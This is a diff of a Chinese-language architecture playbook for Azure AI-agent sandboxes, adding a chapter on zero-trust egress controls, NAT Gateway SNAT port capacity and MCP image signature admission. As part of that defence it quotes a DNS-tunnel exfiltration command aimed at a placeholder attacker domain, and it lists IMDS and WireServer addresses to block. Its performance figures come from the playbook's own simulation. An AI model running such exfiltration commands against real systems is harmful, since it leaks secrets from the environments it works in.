@@ -460,7 +460,7 @@ flowchart LR
 
 - **Step 04 Validate（1/2 Day Hands-on Workshop + Architecture Design Session）是整个漏斗的决定性转化点**：
   - 📋 **配套现场执行手册**：详见 [`workshop-runbook.md`（Step 04 半日/一日客户动手工坊与白板推演手册）](workshop-runbook.md)，内含分钟级议程、三大实验赛道（Track A `ACA Dynamic Sessions` / Track B `AKSClaw Kata` / Track C `E2B on VMSS D96as_v7`）及 6 项上线门禁检查表；
-  - 🧱 **8 套生产级 IaC 与网关策略蓝图**：[`aksclaw-kata-fleet.yaml`](blueprints/aksclaw-kata-fleet.yaml) · [`e2b-vmss-d96as-v7.bicep`](blueprints/e2b-vmss-d96as-v7.bicep) · [`e2b-apim-per-host-policy.xml`](blueprints/e2b-apim-per-host-policy.xml) · [`aca-dynamic-sessions-pool.bicep`](blueprints/aca-dynamic-sessions-pool.bicep) · [`entra-agent-id-ai-gateway-policy.xml`](blueprints/entra-agent-id-ai-gateway-policy.xml) · [`horizondb-langgraph-checkpointer.py`](blueprints/horizondb-langgraph-checkpointer.py) · [`agent-finops-cost-anomaly-alert.bicep`](blueprints/agent-finops-cost-anomaly-alert.bicep) · [`aksclaw-confidential-snp-nodepool.bicep`](blueprints/aksclaw-confidential-snp-nodepool.bicep)；
+  - 🧱 **9 套生产级 IaC 与网关策略蓝图**：[`aksclaw-kata-fleet.yaml`](blueprints/aksclaw-kata-fleet.yaml) · [`e2b-vmss-d96as-v7.bicep`](blueprints/e2b-vmss-d96as-v7.bicep) · [`e2b-apim-per-host-policy.xml`](blueprints/e2b-apim-per-host-policy.xml) · [`aca-dynamic-sessions-pool.bicep`](blueprints/aca-dynamic-sessions-pool.bicep) · [`entra-agent-id-ai-gateway-policy.xml`](blueprints/entra-agent-id-ai-gateway-policy.xml) · [`horizondb-langgraph-checkpointer.py`](blueprints/horizondb-langgraph-checkpointer.py) · [`agent-finops-cost-anomaly-alert.bicep`](blueprints/agent-finops-cost-anomaly-alert.bicep) · [`aksclaw-confidential-snp-nodepool.bicep`](blueprints/aksclaw-confidential-snp-nodepool.bicep) · [`aksclaw-zero-trust-egress-firewall-pls.bicep`](blueprints/aksclaw-zero-trust-egress-firewall-pls.bicep)；
   - 上午通过 **Hands-on Workshop** 让客户研发团队亲手在 Azure 上跑通 `ACA Dynamic Sessions / Sandboxes` 或 `AKS Kata + MAF + HorizonDB` 的端到端 Demo；
   - 下午通过 **Whiteboard Architecture Session** 对齐并发容量、网络隔离（VNet/Private Endpoint/AppGW+APIM）、身份边界（Entra Agent ID）与故障恢复链路，当场产出经双方架构师确认的 **Target Architecture Diagram** 与上线倒排计划。
 
@@ -606,7 +606,35 @@ sequenceDiagram
 
 ---
 
-## 13. 7-Card 4:5 架构评测结论摘要与可复现验证命令
+## 13. 多租户 Agent 沙箱零信任出向网络治理、SNAT 端口容量物理学与 MCP 供应链签名准入（Multi-Tenant Agent Sandbox Zero-Trust Egress Governance, SNAT Port Physics & MCP Supply-Chain Attestation）
+
+> 本章由确定性仿真模型 [`simulate_egress_exfiltration_and_mcp_supply_chain()`](simulator/agent_infra_sizer.py) 与生产蓝图 [`blueprints/aksclaw-zero-trust-egress-firewall-pls.bicep`](blueprints/aksclaw-zero-trust-egress-firewall-pls.bicep) 驱动，解决大规模自主 Agent 在执行未知代码与加载第三方 MCP Server 时的三大生产网络与供应链隐患：**① Prompt 注入通过 DNS 隧道或隐蔽信道外带敏感数据；② 数万沙箱并发调用工具瞬间打满 Azure NAT Gateway 64,000 SNAT 端口导致连接静默丢包；③ 恶意或未签名 MCP 工具镜像在沙箱内提权或横向探测。**
+
+### 13.1 零信任出向治理与 MCP 准入四层纵深防线
+
+1. **Layer 1 · Cilium eBPF Socket-Level Filter + IMDS/WireServer 物理黑洞**：
+   - 在宿主机内核 `cgroup/connect4` 挂载 Cilium eBPF 过滤器，直接阻断沙箱对 `169.254.169.254/32`（Azure IMDS）、`168.63.129.16/32`（Azure WireServer）及内网 RFC1918 东西向网段的套接字发起请求；
+   - **性能优势**：eBPF O(1) 哈希查找仅需 **`0.06 ms`**（`< 0.08 ms`），相比传统 `iptables` 遍历 5,000 条线性规则链（**`1.90 ms`**）降低 **96.8%** 的策略损耗。
+2. **Layer 2 · CoreDNS 香农熵过滤 + Azure Firewall Premium TLS/IDPS 深度检测**：
+   - 拦截通过 `nslookup <base32-secret>.attacker.com` 发起的 DNS 隧道数据外带：在 CoreDNS / Firewall DNS Proxy 层对查询标签执行实时香农熵检测（拦截 `Shannon entropy > 4.1 bits/char` 或单级子域名长度 `> 52 chars`），实现 **`99.94%`** 的 DNS 隧道外带阻断率；
+   - 出网 HTTPS 流量强制经 **Azure Firewall Premium** 执行 TLS 解密检查、IDPS 签名阻断与 FQDN 白名单过滤（仅放行受控镜像源如 `*.pypi.org`、`registry.npmjs.org`），仅引入 **`+2.40 ms` p95** 检测耗时。
+3. **Layer 3 · Azure Private Link 全私网数据面卸载 vs 公网 NAT Gateway SNAT 端口耗尽物理学**：
+   - Azure NAT Gateway 每个公网 IP 提供 **`64,000` 个 SNAT 临时端口**（单网关最高挂载 `16` 个公网 IP = `1,024,000` 端口）。若 `25,000` 个并发沙箱直接通过公网访问模型、存储与数据库（平均每沙箱 `6` 条并发连接 = `150,000` 个 SNAT 端口），仅配置 `2` 个公网 IP（`128,000` 端口）将导致 **`117.2%` 端口过载与大规模 `SYN` 丢包**；
+   - 通过将 Foundry Models、Azure Blob Storage、Key Vault 与 HorizonDB 全部切换至 **Azure Private Link (Private Endpoints)**，可直接在私网卸载 **`78%` 的出向连接**（公网 SNAT 占用从 `150,000` 骤降至 **`33,000`**），同时消除公网 Hairpin 绕行，使端到端工具调用 P95 RTT **净降低 `-1.34 ms`（Private Link `-3.80 ms` 抵消防火墙 `+2.46 ms` 后仍快于公网直连）**。
+4. **Layer 4 · MCP 工具镜像 Notation/Cosign (SLSA Level 3) 签名校验与能力清单准入**：
+   - 沙箱动态拉起外部 MCP Server 时，强制校验 OCI 制品的 **Notation / Sigstore Cosign 签名与 SLSA Level 3 构建溯源证明**，并解析最小权限能力清单（如 `fs:read-only`、`net:none`、`secret:none`），本地缓存命中校验仅需 **`4.60 ms`**（冷校验 `21.00 ms`），100% 阻断未签名或超权 MCP 插件。
+
+### 13.2 四层零信任出向治理与 SNAT 容量定量对比矩阵
+
+| 架构方案与并发沙箱规模 | L1 策略引擎耗时 | DNS 隧道外带拦截率 | 原始出向连接数 | Private Link 私网卸载率 | 公网 SNAT 活跃端口数 | NAT Gateway 公网 IP 数 (总容量) | **SNAT 端口利用率 (安全线 ≤80%)** | **净出向 P95 RTT 变化** | **L4 MCP 签名准入耗时** |
+|---|---:|---:|---:|---:|---:|---|---:|---:|---:|
+| **`25,000` 沙箱 · Cilium eBPF + FW Premium + Private Link (推荐)** | **`0.06 ms`** | **`99.94%`** | `150,000` | **`78.0%`** | **`33,000`** | `8 IPs` (`/29` · `512,000` 端口) | **`6.4%` (✅ 极安全)** | **`-1.34 ms` (更快)** | **`4.60 ms` (`cached`)** |
+| **`100,000` 沙箱 · Cilium eBPF + FW Premium + Private Link (超大规模)** | **`0.06 ms`** | **`99.94%`** | `600,000` | **`78.0%`** | **`132,000`** | `8 IPs` (`/29` · `512,000` 端口) | **`25.8%` (✅ 安全)** | **`-1.34 ms` (更快)** | **`4.60 ms` (`cached`)** |
+| `25,000` 沙箱 · 传统 `iptables` + 纯公网 NAT (无 Private Link 反模式) | `1.90 ms` | `0.00%` (无拦截) | `150,000` | `0.0%` | `150,000` | `2 IPs` (`128,000` 端口) | **`117.2%` (❌ SNAT 耗尽丢包)** | `+1.90 ms` | `0.00 ms` (❌ 无校验) |
+
+---
+
+## 14. 7-Card 4:5 架构评测结论摘要与可复现验证命令
 
 本 Playbook 严格遵循 `turbo998/benchmark-harness-engineering` 的 **7-Card 4:5 视觉评测报告规范**，配套提供可离线运行并复现全部容量测算、选型矩阵与 SVG 图表的 Python 工具链：
 
@@ -619,10 +647,10 @@ sequenceDiagram
 # 1. 运行确定性架构选型器与 10万并发 E2B 集群容量测算校验
 python simulator/agent_infra_sizer.py --check
 
-# 2. 运行深度定量模型（Firecracker 缺页分解 + AKSClaw Kata 密度 + HorizonDB 留存 + 跨区 DR + FinOps Spot 排空 + SEV-SNP 机密沙箱）
+# 2. 运行深度定量模型（Firecracker 缺页分解 + AKSClaw Kata 密度 + HorizonDB 留存 + 跨区 DR + FinOps Spot 排空 + SEV-SNP 机密沙箱 + 零信任出网/MCP 准入）
 python simulator/e2b_aksclaw_deep_benchmark.py
 
-# 3. 运行全部 16 项单元测试（验证 6 大运行时契约、v6/v7 延迟基准、跨区 DR、FinOps Spot 排空、SEV-SNP 机密沙箱与链接完整性）
+# 3. 运行全部 17 项单元测试（验证 6 大运行时契约、v6/v7 延迟基准、跨区 DR、FinOps Spot 排空、SEV-SNP 机密沙箱、零信任出网 SNAT/MCP 准入与链接完整性）
 python simulator/test_agent_infra_sizer.py -v
 
 # 4. 重新生成并校验全部 8 张 SVG 架构图、H5 交互套件与 7-Card 评测报告
